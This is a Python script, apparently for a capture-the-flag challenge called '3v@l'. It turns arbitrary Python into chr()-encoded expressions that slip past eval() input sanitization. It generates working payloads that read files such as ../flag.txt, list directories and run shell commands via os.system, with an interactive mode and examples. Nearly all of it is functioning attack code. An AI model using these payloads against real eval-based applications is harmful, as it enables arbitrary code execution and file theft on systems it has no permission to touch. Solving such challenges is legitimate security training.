#!/usr/bin/env python3
"""
Payload Generator for 3v@l Challenge
====================================

This script converts Python code into chr() sequences to bypass eval() sanitization.
It takes any Python code and converts each character to its decimal ASCII value,
then constructs the payload using chr() function calls and string concatenation.

Usage:
    python payload_generator.py
    
Example:
    Input: open("../flag.txt").read()
    Output: getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
"""

def string_to_chr_sequence(text):
    """
    Convert a string to a chr() sequence.
    
    Args:
        text (str): The string to convert
        
    Returns:
        str: The chr() sequence representation
    """
    if not text:
        return '""'
    
    chr_parts = []
    for char in text:
        chr_parts.append(f"chr({ord(char)})")
    
    return "+".join(chr_parts)

def convert_simple_expression(code):
    """
    Convert simple Python expressions to chr() sequences.
    Handles basic patterns like function calls and attribute access.
    
    Args:
        code (str): Python code to convert
        
    Returns:
        str: Converted payload using chr() sequences
    """
    # Remove whitespace for cleaner processing
    code = code.strip()
    
    # Handle simple file reading patterns - detect even if quotes are missing
    if (code.startswith('open(') and code.endswith(').read()')) or \
       (code.startswith('open(') and code.endswith('.read()')):
        
        # Extract the filename - handle cases where quotes might be stripped by shell
        if '"' in code:
            start = code.find('"') + 1
            end = code.rfind('"')
            filename = code[start:end]
        elif "'" in code:
            start = code.find("'") + 1
            end = code.rfind("'")
            filename = code[start:end]
        else:
            # No quotes - extract between open( and ).read() or .read()
            start = code.find('open(') + 5
            if ').read()' in code:
                end = code.find(').read()')
            else:
                end = code.find('.read()')
            filename = code[start:end]
        
        # Generate the payload
        builtins_seq = string_to_chr_sequence("builtins")
        open_seq = string_to_chr_sequence("open")
        filename_seq = string_to_chr_sequence(filename)
        read_seq = string_to_chr_sequence("read")
        
        payload = f"getattr(getattr(__import__({builtins_seq}),{open_seq})({filename_seq}),{read_seq})()"
        return payload
    
    # Handle os.listdir patterns
    elif code.startswith('os.listdir(') and code.endswith(')'):
        # Extract the path - handle cases where quotes might be stripped
        if '"' in code:
            start = code.find('"') + 1
            end = code.rfind('"')
        elif "'" in code:
            start = code.find("'") + 1
            end = code.rfind("'")
        else:
            # No quotes - extract between listdir( and )
            start = code.find('listdir(') + 8
            end = code.rfind(')')
        
        path = code[start:end]
        
        # Generate the payload
        os_seq = string_to_chr_sequence("os")
        listdir_seq = string_to_chr_sequence("listdir")
        path_seq = string_to_chr_sequence(path)
        
        payload = f"getattr(__import__({os_seq}), {listdir_seq})({path_seq})"
        return payload
    
    # Handle os.system("command")
    elif code.startswith('os.system(') and code.endswith(')'):
        # Extract the command
        if '"' in code:
            start = code.find('"') + 1
            end = code.rfind('"')
        elif "'" in code:
            start = code.find("'") + 1
            end = code.rfind("'")
        else:
            start = code.find('system(') + 7
            end = code.rfind(')')
        
        command = code[start:end]
        
        # Generate the payload
        os_seq = string_to_chr_sequence("os")
        system_seq = string_to_chr_sequence("system")
        command_seq = string_to_chr_sequence(command)
        
        payload = f"getattr(__import__({os_seq}), {system_seq})({command_seq})"
        return payload
    
    # Handle __import__("module").function("arg")
    elif code.startswith('__import__(') and ').' in code:
        # This is a more complex case, for now just convert to chr sequence
        return string_to_chr_sequence(code)
    
    # Handle arbitrary string conversion
    else:
        return string_to_chr_sequence(code)

def interactive_mode():
    """
    Interactive mode for the payload generator.
    """
    print("=" * 60)
    print("3v@l Payload Generator")
    print("=" * 60)
    print("Convert Python code to chr() sequences for eval bypass")
    print("Type 'quit' or 'exit' to stop")
    print("Type 'help' for examples")
    print("-" * 60)
    
    while True:
        try:
            user_input = input("\nEnter Python code: ").strip()
            
            if user_input.lower() in ['quit', 'exit', 'q']:
                print("Goodbye!")
                break
            
            if user_input.lower() == 'help':
                show_help()
                continue
            
            if not user_input:
                print("Please enter some code to convert.")
                continue
            
            # Convert the input
            payload = convert_simple_expression(user_input)
            
            print(f"\nOriginal code:")
            print(f"  {user_input}")
            print(f"\nGenerated payload:")
            print(f"  {payload}")
            
            # Show character breakdown for educational purposes
            if len(user_input) <= 20:  # Only for short inputs
                print(f"\nCharacter breakdown:")
                for i, char in enumerate(user_input):
                    print(f"  '{char}' -> chr({ord(char)})")
            
        except KeyboardInterrupt:
            print("\n\nGoodbye!")
            break
        except Exception as e:
            print(f"Error: {e}")

def show_help():
    """
    Display help information with examples.
    """
    print("\n" + "=" * 50)
    print("EXAMPLES")
    print("=" * 50)
    print("\n1. File Reading:")
    print('   Input:  open("../flag.txt").read()')
    print('   Output: getattr(getattr(__import__(chr(98)+...),chr(111)+...)(chr(46)+...),chr(114)+...)()') 
    
    print("\n2. Directory Listing:")
    print('   Input:  os.listdir("..")')
    print('   Output: getattr(__import__(chr(111)+chr(115)), chr(108)+...)(chr(46)+chr(46))')
    
    print("\n3. Simple String:")
    print('   Input:  hello')
    print('   Output: chr(104)+chr(101)+chr(108)+chr(108)+chr(111)')
    
    print("\n4. Complex Expressions:")
    print('   Input:  __import__("os").system("ls")')
    print('   Output: chr(95)+chr(95)+chr(105)+... (converts entire string)')
    
    print("\nCOMMANDS:")
    print("- help: Show this help message")
    print("- quit/exit: Exit the program")
    
    print("\nTIPS:")
    print("- Use double quotes for strings in your input")
    print("- The tool handles common patterns like file operations")
    print("- For complex code, it will convert the entire string to chr() sequences")
    print("- Generated payloads should work directly in eval() bypass scenarios")

def batch_mode(code):
    """
    Convert code without interactive prompts.
    
    Args:
        code (str): Python code to convert
        
    Returns:
        str: Generated payload
    """
    return convert_simple_expression(code)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        # Command line mode
        code = " ".join(sys.argv[1:])
        payload = batch_mode(code)
        print(f"Original: {code}")
        print(f"Payload:  {payload}")
    else:
        # Interactive mode
        interactive_mode()
